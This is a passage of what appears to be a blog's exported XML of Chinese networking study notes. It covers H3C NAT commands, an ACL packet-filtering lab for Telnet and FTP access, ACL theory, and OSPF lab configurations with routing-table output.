&#39;group-number&#39;#在公网接口上配置NAPT</code></p><p><code>[h3c-GigabitEthernet0/0]nat outbound &#39;acl-number&#39; #在公网接口上配置Easy IP</code></p><p><code>[h3c-GigabitEthernet0/0]nat server protocol &#39;tcp/udp/icmp&#39; global &#39;global-address&#39; &#39;global-port&#39; inside &#39;inside-address&#39; &#39;inside-port&#39;#在公网接口上配置NAT Server</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACL实验</title>
      <link href="/posts/468b"/>
      <url>/posts/468b</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/ACL%E5%AE%9E%E9%AA%8C/01.jpg"></p><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示配置 IP 地址</p><p>2.全网路由互通</p><p>3.在 SERVER1 上配置开启 TELNET 和 FTP 服务</p><p>4.配置 ACL 实现如下效果</p><p>​01.<code>192.168.1.0/24</code> 网段不允许访问 <code>192.168.2.0/24</code> 网段，要求使用基本 ACL 实现</p><p>​02.PC1 可以访问 SERVER1 的 TELNET 服务，但不能访问 FTP 服务</p><p>​03.PC2 可以访问 SERVER1 的 FTP 服务，但不能访问 TELNET 服务</p><p>​04.<code>192.168.2.0/24</code> 网段不允许访问 SERVER1，要求通过高级 ACL 实现</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置 IP 地址部分略</strong></p><p>2.<strong>R1，R2，R3 上配置 RIP 使全网路由互通，步骤略</strong></p><p>3.<strong>在 SERVER1 上配置开启 TELNET 和 FTP 服务部分略</strong></p><p>4.<strong>配置 ACL 部分</strong></p><p><em>分析：需求 i，要求 <code>192.168.1.0/24</code> 网段不允许访问 <code>192.168.2.0/24</code> 网段，只能使用基本 ACL 实现。基本 ACL 只过滤源 IP 地址，只能在 R2 的 g0&#x2F;2 接口上配置出方向包过滤来实现。如果配置在两个网段沿途的其他位置，将会影响到 <code>192.168.1.0/24</code> 网段和其他网段的正常通讯<br> 　　需求 ii，PC1 可以访问 SERVER1 的 TELNET 服务，但不能访问 FTP 服务。既然要过滤指定的服务，就只能使用高级 ACL，高级 ACL 不会造成误过滤，所以可以配置在离源地址最近的接口的入方向，也就是 R1 的 g0&#x2F;1 接口的入方向。另外，由于 H3C 的 ACL 用于包过滤默认动作是允许，所以并不需要专门配置允许 PC1 访问 SERVER1 的 TELNET，只需要配置拒绝访问 FTP 的规则即可<br> 　　需求 iii，PC2 可以访问 SERVER1 的 FTP 服务，但不能访问 TELNET 服务。同理，只能使用高级 ACL，配置在 R1 的 g0&#x2F;1 接口的入方向。而且也只需要配置拒绝访问 TELNET 的规则即可<br> 　　由于需求 i 和需求 ii 配置在同一个路由器同一个接口的同方向，所以把规则写入到同一个 ACL 即可<br> 　　需求 iv：<code>192.168.2.0/24</code> 网段不允许访问 SERVER1，要求通过高级 ACL 实现。高级 ACL 不会造成误过滤，所以可以配置在离源地址最近的接口的入方向，也就是 R2 的 g0&#x2F;2 接口的入方向。另外，没有明确说明不允许访问什么服务，就是所有都不允许访问，所以高级 ACL 中的协议需要指定为 IP 协议</em><br> 　　<br><em>步骤 1：创建基本 ACL，使 <code>192.168.1.0/24</code> 网段不能访问 <code>192.168.2.0/24</code> 网段，并在 R2 的 g0&#x2F;2 接口的出方向配置包过滤</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]acl basic 2000</span><br><span class="line">[R2-acl-ipv4-basic-2000]rule deny source 192.168.1.0 0.0.0.255</span><br><span class="line">[R2]interface g0/2</span><br><span class="line">[R2-GigabitEthernet0/2]packet-filter 2000 outbound </span><br></pre></td></tr></table></figure><p><em>步骤 2：创建高级 ACL，使 PC1 可以访问 SERVER1 的 TELNET 服务，但不能访问 FTP 服务；PC2 可以访问 SERVER1 的 FTP 服务，但不能访问 TELNET 服务，并在 R1 的 g0&#x2F;1 接口的入方向配置包过滤</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl advanced 3000</span><br><span class="line">[R1-acl-ipv4-adv-3000]rule deny tcp source 192.168.1.1 0 destination 192.168.3.1 0 destination-port range 20 21</span><br><span class="line">[R1-acl-ipv4-adv-3000]rule deny tcp source 192.168.1.2 0 destination 192.168.3.1 0 destination-port eq 23</span><br><span class="line">[R1]interface g0/1</span><br><span class="line">[R1-GigabitEthernet0/1]packet-filter 3000 inbound</span><br></pre></td></tr></table></figure><p><em>步骤 3：创建高级 ACL，使PC3 不能访问 SERVER1，并在 R2 的 g0&#x2F;2 接口的入方向配置包过滤</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]acl advanced 3000</span><br><span class="line">[R2-acl-ipv4-adv-3000]rule deny ip source 192.168.2.0 0.0.0.255 destination 192.168.3.1 0</span><br><span class="line">[R2]interface g0/2</span><br><span class="line">[R2-GigabitEthernet0/2]packet-filter 3000 inbound </span><br></pre></td></tr></table></figure><p>5.<strong>效果测试</strong></p><p><em>步骤 1：PC1 和 PC2 都无法 Ping 通 PC3</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[PC1]ping 192.168.2.1</span><br><span class="line">Ping 192.168.2.1 (192.168.2.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br></pre></td></tr></table></figure><p><em>步骤 2：PC1 可以连接 SERVER1 的 TELNET，但不能连接 FTP</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC1&gt;telnet 192.168.3.1</span><br><span class="line">Trying 192.168.3.1 ...</span><br><span class="line">Press CTRL+K to abort</span><br><span class="line">Connected to 192.168.3.1 ...</span><br><span class="line"></span><br><span class="line">    ******************************************************************************</span><br><span class="line">* Copyright (c) 2004-2017 New H3C Technologies Co., Ltd. All rights reserved.*</span><br><span class="line">* Without the owner&#x27;s prior written consent,                                 *</span><br><span class="line">* no decompiling or reverse-engineering shall be allowed.                    *</span><br><span class="line">    ******************************************************************************</span><br><span class="line"></span><br><span class="line">login: </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC1&gt;ftp 192.168.3.1</span><br><span class="line">Press CTRL+C to abort.</span><br></pre></td></tr></table></figure><p><em>步骤 3：PC2 可以连接 SERVER1 的 FTP，但不能连接 TELNET</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC2&gt;ftp 192.168.3.1</span><br><span class="line">Press CTRL+C to abort.</span><br><span class="line">Connected to 192.168.3.1 (192.168.3.1).</span><br><span class="line">220 FTP service ready.</span><br><span class="line">User (192.168.3.1:(none)): </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;PC2&gt;telnet 192.168.3.1</span><br><span class="line">Trying 192.168.3.1 ...</span><br><span class="line">Press CTRL+K to abort</span><br><span class="line">Connected to 192.168.3.1 ...</span><br></pre></td></tr></table></figure><p><em>步骤 4：PC3 不能 Ping 通 SERVER1</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[PC3]ping 192.168.3.1</span><br><span class="line">Ping 192.168.3.1 (192.168.2.3): 56 data bytes, press CTRL_C to break</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br><span class="line">Request time out</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACL包过滤</title>
      <link href="/posts/f6"/>
      <url>/posts/f6</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><p>Access Control List</p><p>定义</p><ul><li><code>访问控制列表</code></li><li><code>用于数据流的配置和筛选</code></li></ul><p>常见功能</p><ul><li><code>访问控制ACL+Packet-filter</code></li><li><code>路由控制ACL+Router-policy</code></li><li><code>流量控制ACL+QOS</code></li></ul><h3 id="基于ACL的包过滤"><a href="#基于ACL的包过滤" class="headerlink" title="基于ACL的包过滤"></a>基于ACL的包过滤</h3><p>定义</p><ul><li><code>对进出的数据包逐包检查，丢弃或允许通过</code></li><li><code>包过滤必须配置在接口的某个方向上才能生效</code></li><li><code>一个接口的一个方法只能配置一个包过滤策略</code></li></ul><p>包过滤的方向</p><ul><li><code>入方向只对从外部进入的数据包做过滤</code></li><li><code>出方向    只对从内部发出的数据包做过滤</code></li></ul><p>包过滤的工作流程</p><p><img src="/images/ACL%E5%8C%85%E8%BF%87%E6%BB%A4/01.jpg"></p><ul><li><p><code>1.数据包到达接口检查是否应用了ACL，是则进入匹配，否则放行</code></p></li><li><p><code>2.按照ACL编号匹配第一条规则，匹配则进一步检查该条规则动作，否则与下一跳规则进行匹配</code></p><ul><li><code>动作允许则放行，动作拒绝则丢弃</code></li></ul></li><li><p><code>3.继续进行匹配，如匹配则检查规则动作，否则与下一跳进行匹配</code></p></li><li><p><code>4.所有规则都不匹配，检查默认动作</code></p><ul><li><code>默认动作允许则放行默认动作拒绝则丢弃</code></li></ul></li></ul><p>注意事项</p><ul><li><code>如果默认动作是允许，至少需要一条拒绝规则，否则没意义</code></li><li><code>如果默认动作是拒绝，至少需要一条允许规则，否则没意义</code></li><li><code>H3C的ACL用于包过滤默认允许，用于其他默认拒绝</code></li><li><code>把小范围的规则分配一个靠前的顺序</code></li><li><code>在不影响实际效果前提下，把包过滤尽量配置在离源地址最近的接口的入方向</code></li></ul><h3 id="ACL分类"><a href="#ACL分类" class="headerlink" title="ACL分类"></a>ACL分类</h3><p>基本ACL</p><ul><li><code>只对数据包的源地址进行匹配</code></li><li><code>编号2000-2999</code></li></ul><p>高级ACL</p><ul><li><code>对数据包的五元组进行配置（源IP,目的IP,源端口,目的端口,协议）</code></li><li><code>编号3000-3999</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c]acl basic &#39;acl-number&#39;   #创建基本ACL，进入ACl视图</code></p><p><code>[h3c]acl advanced &#39;acl-number&#39;#创建高级ACL，进入ACL视图</code></p><p><code>[h3c-acl-basic-2000]rule &#39;rule id&#39; &#39;permit/deny&#39; source &#39;ip address&#39; &#39;wild-mask&#39;</code></p><p><code>#创建基本ACL规则。如不写rule-id，则系统自动从0开始以5的倍数增加序列</code></p><p><code>[h3c-acl-basic-3000]rule &#39;rule id&#39; &#39;protocol&#39; source &#39;ip address&#39; &#39;wild-mask&#39; source-port &#39;port&#39; destination &#39;ip address&#39; &#39;wild-mask&#39; destination-port &#39;port&#39;#创建高级ACl规则</code></p><p><code>[h3c-GigabitEthernet 0/0]packet-filter &#39;acl number&#39;  &#39;inbound/outbound&#39;#配置包过滤</code></p><p><code>[h3c]packet-filter default deny#更改默认动作为拒绝</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSPF实验</title>
      <link href="/posts/7046"/>
      <url>/posts/7046</url>
      
        <content type="html"><![CDATA[<br /><br /><br /><br /><h2 id="OSPF实验1"><a href="#OSPF实验1" class="headerlink" title="OSPF实验1"></a>OSPF实验1</h2><hr><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/OSPF%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示配置 IP 地址</p><p>2.按照图示分区域配置 OSPF ，实现全网互通</p><p>3.为了路由结构稳定，要求路由器使用环回口作为 Router-id，ABR 的环回口宣告进骨干区域</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置 IP 地址部分略</strong></p><p>2.<strong>按照图示分区域配置 OSPF ，实现全网互通</strong></p><p>　　<em>分析：实现全网互通，意味着每台路由器都要宣告本地的所有直连网段，包括环回口所在的网段。要求 ABR 的环回口宣告进骨干区域，即区域 0，<br>　　同时，每台路由器手动配置各自环回口的 IP 地址作为 Router-id</em></p><p><em>步骤 1：在路由器上分别配置 OSPF，按区域宣告所有直连网段和环回口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1]ospf 1 router-id 1.1.1.1</span><br><span class="line">[R1-ospf-1]area 0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 1.1.1.1 0.0.0.0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 100.1.1.0 0.0.0.255</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]area 1</span><br><span class="line">[R1-ospf-1-area-0.0.0.1]network 100.3.3.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R2]ospf 1 router-id 2.2.2.2</span><br><span class="line">[R2-ospf-1]area 0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 2.2.2.2 0.0.0.0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 100.1.1.0 0.0.0.255</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 100.2.2.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R3]ospf 1 router-id 3.3.3.3</span><br><span class="line">[R3-ospf-1]area 0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 3.3.3.3 0.0.0.0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 100.2.2.0 0.0.0.255</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]area 2</span><br><span class="line">[R3-ospf-1-area-0.0.0.2]network 100.4.4.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R4]ospf 1 router-id 4.4.4.4</span><br><span class="line">[R4-ospf-1]area 1</span><br><span class="line">[R4-ospf-1-area-0.0.0.1]network 4.4.4.4 0.0.0.0</span><br><span class="line">[R4-ospf-1-area-0.0.0.1]network 100.3.3.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R5]ospf 1 router-id 5.5.5.5</span><br><span class="line">[R5-ospf-1]area 2</span><br><span class="line">[R5-ospf-1-area-0.0.0.2]network 5.5.5.5 0.0.0.0</span><br><span class="line">[R5-ospf-1-area-0.0.0.2]network 100.4.4.0 0.0.0.255</span><br></pre></td></tr></table></figure><p>3.<strong>检查是否全网互通</strong></p><p>　　<em>分析：检查 OSPF 是否全网互通，一个是检查邻居关系表，看邻居关系是否正常；另一个是检查路由表，看是否学习到全网路由<br>　　这里只展示 R1 的检查结果</em><br>　　<br><em>步骤 1：检查 R1 的邻居关系表</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ospf peer </span><br><span class="line"></span><br><span class="line">     OSPF Process 1 with Router ID 1.1.1.1</span><br><span class="line">           Neighbor Brief Information</span><br><span class="line"></span><br><span class="line"> Area: 0.0.0.0        </span><br><span class="line"> Router ID       Address         Pri Dead-Time  State             Interface</span><br><span class="line"> 2.2.2.2         100.1.1.2       1   36         Full/BDR          GE0/0</span><br><span class="line"></span><br><span class="line"> Area: 0.0.0.1        </span><br><span class="line"> Router ID       Address         Pri Dead-Time  State             Interface</span><br><span class="line"> 4.4.4.4         100.3.3.4       1   36         Full/DR           GE0/1</span><br></pre></td></tr></table></figure><p>　　<em>说明：可以看到，R1 分别和 R2 和 R4 建立了邻接关系，状态为 FULL，邻居关系正常</em><br>　　<br><em>步骤 2：检查 R1 的路由表</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> [R1]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">1.1.1.1/32         Direct  0   0           127.0.0.1       InLoop0</span><br><span class="line">2.2.2.2/32         O_INTRA 10  1           100.1.1.2       GE0/0</span><br><span class="line">3.3.3.3/32         O_INTRA 10  2           100.1.1.2       GE0/0</span><br><span class="line">4.4.4.4/32         O_INTRA 10  1           100.3.3.4       GE0/1</span><br><span class="line">5.5.5.5/32         O_INTER 10  3           100.1.1.2       GE0/0</span><br><span class="line">100.1.1.0/24       Direct  0   0           100.1.1.1       GE0/0</span><br><span class="line">100.1.1.0/32       Direct  0   0           100.1.1.1       GE0/0</span><br><span class="line">100.1.1.1/32       Direct  0   0           127.0.0.1       InLoop0</span><br><span class="line">100.1.1.255/32     Direct  0   0           100.1.1.1       GE0/0</span><br><span class="line">100.2.2.0/24       O_INTRA 10  2           100.1.1.2       GE0/0</span><br><span class="line">100.3.3.0/24       Direct  0   0           100.3.3.1       GE0/1</span><br><span class="line">100.3.3.0/32       Direct  0   0           100.3.3.1       GE0/1</span><br><span class="line">100.3.3.1/32       Direct  0   0           127.0.0.1       InLoop0</span><br><span class="line">100.3.3.255/32     Direct  0   0           100.3.3.1       GE0/1</span><br><span class="line">100.4.4.0/24       O_INTER 10  3           100.1.1.2       GE0/0</span><br></pre></td></tr></table></figure><p>　　<em>说明：可以看到，R1 已经学习到了全网所有网段的路由信息</em></p><br /><h2 id="OSPF实验2"><a href="#OSPF实验2" class="headerlink" title="OSPF实验2"></a>OSPF实验2</h2><h3 id="实验拓扑-1"><a href="#实验拓扑-1" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/OSPF%E5%AE%9E%E9%AA%8C/02"><em>图2-1</em></p><hr><h3 id="实验需求-1"><a href="#实验需求-1" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示配置 IP 地址</p><p><strong>II</strong>.R1，R2，R3 运行 OSPF 使内网互通，所有接口（公网接口除外）全部宣告进 Area 0；要求使用环回口作为 Router-id</p><p><strong>III</strong>.业务网段不允许出现协议报文</p><p><strong>IV</strong>.R5 模拟互联网，内网通过 R1 连接互联网，在 R1 上配置默认路由并引入到 OSPF</p><p><strong>V</strong>.R1 上配置 EASY IP，只允许业务网段访问互联网</p><p><strong>VI</strong>.要求业务网段访问互联网流量经过 R3，R2，R1</p><hr><h3 id="实验解法-1"><a href="#实验解法-1" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>配置 IP 地址部分略</strong></p><p>II.<strong>R1，R2，R3 运行 OSPF 使内网互通，所有接口（公网接口除外）全部宣告进 Area 0；要求使用环回口作为 Router-id</strong></p><p><em>步骤 1：创建 OSPF 进程，手动指定环回口地址为 Router-id，把所有内网接口宣告进 Area 0</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]ospf router-id 1.1.1.1</span><br><span class="line">[R1-ospf-1]area 0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 10.1.1.0 0.0.0.255</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 10.2.2.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]ospf router-id 2.2.2.2</span><br><span class="line">[R2-ospf-1]area 0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 10.1.1.0 0.0.0.255</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 10.3.3.0 0.0.0.255</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R3]ospf router-id 3.3.3.3</span><br><span class="line">[R3-ospf-1]area 0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 10.2.2.0 0.0.0.255</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 10.3.3.0 0.0.0.255</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255</span><br></pre></td></tr></table></figure><p>III.<strong>业务网段不允许出现协议报文</strong></p><p><em>步骤 1：把 R3 连接业务网段的 g0&#x2F;2 口配置为静默接口，防止协议报文冲击业务网段</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R3-ospf-1]silent-interface g0/2</span><br></pre></td></tr></table></figure><p>IV.<strong>R5 模拟互联网，内网通过 R1 连接互联网，在 R1 上配置默认路由并引入到 OSPF</strong></p><p><em>步骤 1：在 R1 上配置默认路由，下一跳指向为 <code>202.1.1.5</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 202.1.1.5</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R1 上把默认路由引入到 OSPF</em></p><p>　　<em>分析：因为 R1 上已经配置了默认路由，所以引入在 OSPF 中引入默认路由时，不需要带 <code>always</code> 参数</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-ospf-1]default-route-advertise</span><br></pre></td></tr></table></figure><p><em>效果测试：在 R2 和 R3 上查看路由表，发现已经有了默认路由，路由来源是 <code>O_ASE2</code>，说明是从 OSPF 学习到的外部路由</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R2]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destinations : 20       Routes : 21</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">0.0.0.0/0          O_ASE2  150 1           10.1.1.1        GE0/0</span><br><span class="line">……</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R3]display ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 23       Routes : 24</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">0.0.0.0/0          O_ASE2  150 1           10.2.2.1        GE0/0</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>V.<strong>R1 上配置 EASY IP，只允许业务网段访问互联网</strong></p><p><em>步骤 1：在 R1 上创建基本 ACL，只允许业务网段 <code>192.168.1.0/24</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl basic 2000</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule permit source 192.168.1.0 0.0.0.255</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R1 的公网接口上，配置 EASY IP，使内网可以访问互联网</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/2]nat outbound 2000</span><br></pre></td></tr></table></figure><p><em>效果测试：在 PC4 上 PING R5的环回口地址，PING 通说明可以访问互联网</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 100.1.1.1</span><br><span class="line">Ping 100.1.1.1 (100.1.1.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=0 ttl=253 time=53.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=1 ttl=253 time=263.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=2 ttl=253 time=29.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=3 ttl=253 time=74.000 ms</span><br><span class="line">56 bytes from 100.1.1.1: icmp_seq=4 ttl=253 time=62.000 ms</span><br></pre></td></tr></table></figure><p>VI.<strong>要求业务网段访问互联网流量经过 R3，R2，R1，来回路径一致</strong></p><p>　　<em>分析：按照 OSPF 选路规则，内网各链路 Cost 一致，业务网段到互联网的流量会优先选择路由经过 R3，R1，而不会经过 R2<br>　　要想使流量经过 R2，就需要通过修改链路 Cost，使 R1-R3 的 Cost 比 R1-R2-R3 的 Cost 大，这里把 R1-R3 的 Cost 修改为 1000，来影响 OSPF 选路</em><br>　　<br><em>步骤 1：把 R1 和 R3 相连的接口的 Cost 修改为 1000</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/0]ospf cost 1000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R3-GigabitEthernet0/0]ospf cost 1000</span><br></pre></td></tr></table></figure><p><em>效果测试：查看 R1，R2，R3 的路由表，确认默认路由和 <code>192.168.1.0/24</code> 网段的路由是经过 R1，R2，R3</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destinations : 24       Routes : 24</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">192.168.1.0/24     O_INTRA 10  3           10.1.1.2        GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 